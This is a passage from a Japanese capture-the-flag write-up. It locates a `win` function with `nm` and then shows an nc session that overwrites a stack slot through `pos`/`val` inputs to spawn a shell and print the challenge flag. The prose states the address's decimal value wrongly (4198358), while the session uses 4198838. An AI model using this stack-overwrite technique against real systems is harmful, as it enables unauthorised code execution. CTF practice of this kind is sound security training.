```bash
$ nm ./chal | grep win
00000000004011b6 T win
```

これより、win関数は0x4011b6にあることがわかります。これを10進数に変換すると、4198358になります。

`pos`に入力した数でスタック領域を破壊し、`val`に入力した数でスタック領域を上書きすることができます。スタック領域のどこかに`win`関数のアドレスを上書きすれば、`win`関数が呼び出されてシェルが獲得できます。

```
$ nc 34.170.146.252 40839
pos > 106
val > 4198838
cat flag.txt
Alpaca{u53_455rt_f0r_d3bugg1ng_6a6b4a9333dee37efc645fbd2efd2012}
```
